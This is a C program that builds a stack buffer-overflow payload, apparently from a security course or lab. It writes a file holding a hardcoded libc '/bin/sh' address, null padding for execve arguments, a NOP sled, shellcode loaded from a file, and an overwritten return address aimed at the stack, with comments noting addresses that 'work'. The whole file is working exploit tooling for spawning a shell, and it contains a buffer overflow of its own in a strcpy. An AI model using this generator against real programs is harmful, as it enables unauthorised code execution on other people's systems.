#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char* littleEndian(char *str, int numChars);

// 0x7fffffffdc30 address of buf
// 0x7ffff7b99673 address of /bin/sh/
// 0x7fffffffdca0


#define ADDR_SIZE 64

int main(int argc, char *argv[]){
  FILE *file = fopen("in", "wb");
  FILE *instFp;
  int fileSize;
  int i;
  char ch = 0x90;
  char nul = 0x00;
  char input;
  int numChars;
  unsigned char *instFile;
  unsigned char *addr = malloc(10);
  unsigned char *shAddr = malloc(8);

  //strcpy(addr, "0x7fffffffdc30");

 
  shAddr = littleEndian("0x7ffff7b99678", 8);




  printf("\n");
  strcpy(addr, "0x7fffffffdcb0");
  //BELOW ADDRESS WORKS
  //strcpy(addr, "0x7fffffffdce0");

  unsigned char *byteAddr;

  if(argc != 4){
    printf("Wrong number of arguments, use ./gen [instructions] [num_bytes_in_buffer] [entry_point]\n");
    printf("Instructions: file of instructions to be run. Size must not exceed num_bytes_in_buffer. Expected to be in hex.\n");
    printf("num_bytes_in_buffer: number of bytes in the buffer (assumes buffer is first local variable).\n");
    printf("entry_point: hex value of desired entry point, format: 0x12345678.\n");
    exit(1);
  }

  instFile = argv[1];
  numChars = atoi(argv[2]) - 8; //subtract 8 bytes as we are putting 16 bytes of arguments at beginning of buffer
  

  instFp = fopen(instFile, "rb");

  
  if(file == NULL){
    printf("Error opening file. Exiting.");
    exit(1);
  }

  if (instFp == NULL){
    printf("Error opening instruction file. Exiting.");
    exit(1);
  }

  //find out how many characters are in instruction file
  fseek(instFp, 0L, SEEK_END);
  fileSize = ftell(instFp);
  rewind(instFp);
  
  //exit if we can't fit instructions in buffer
  if(fileSize > numChars){
    printf("Instruction set size cannot exceed number of characters in buffer.");
    exit(1);
  }
  
  //write address of 'sh' in libc memory to file first
  for(i = 0; i < 8; i++){
    fwrite(shAddr+i, 1, 1, file);    
  }

  //write 8 null characters to signify end of args for execve
  for(i = 0; i < 8; i++){
    fwrite(&nul, 1, 1, file);
  }

  //write nop sled up to number of characters
  for(i = fileSize; i < numChars; i++){
    fwrite(&ch, 1, 1, file);
  } 
  
  int j = 0;
  while(j < fileSize){
    input = fgetc(instFp);
    putc(input, file);
    j++;
  }
  
  //fwrite(instructions, sizeof(char), fileSize, file);
     
  /* fill buffer */

  //-2 for the 0x at the start of the string
  byteAddr = littleEndian(addr, strlen(addr) - 2);

  int numWritten = fwrite(byteAddr, sizeof(char), ADDR_SIZE / 8, file);

  printf("%d\n", numWritten);
  
  free(byteAddr);

  fclose(file); 
}

//consider passing output through a parameter & returning size of returned array.
unsigned char* littleEndian(char *addr, int numBytes){
  unsigned char *tmpRet = malloc(ADDR_SIZE / 4);
  unsigned char *ret = malloc(ADDR_SIZE / 8);
  char tmp, tmp2;
  int i = 0, j;

  long long hex = strtoll(addr, NULL, 16);
  
  for(i = 0; i < (ADDR_SIZE / 4) - numBytes; i++){
    tmpRet[i] = 0;
  }

  i = ADDR_SIZE / 4 - 1;

  //place hex into char array hex by hex
  while(hex != 0){ 
    tmpRet[i] = hex & 0xF;
    hex = hex >> 4;
    i--;
  }
   
  //swap byte order
  j = ADDR_SIZE / 4 - 1;
  for(i = 0; i < ADDR_SIZE / 8; i+=2){
    tmp = tmpRet[i];
    tmp2 = tmpRet[i+1];

    tmpRet[i] = tmpRet[j-1];
    tmpRet[i+1] = tmpRet[j];    
    
    tmpRet[j - 1] = tmp;
    tmpRet[j] = tmp2;

    j-=2;
  }
  
  //crunch char array to maintain one byte of hex in each element (rather than a single hex digit).
  for(i = 0; i < ADDR_SIZE / 8; i++){
    ret[i] = tmpRet[(i*2)] << 4 | tmpRet[(i*2)+1];
  }

  return ret;
}
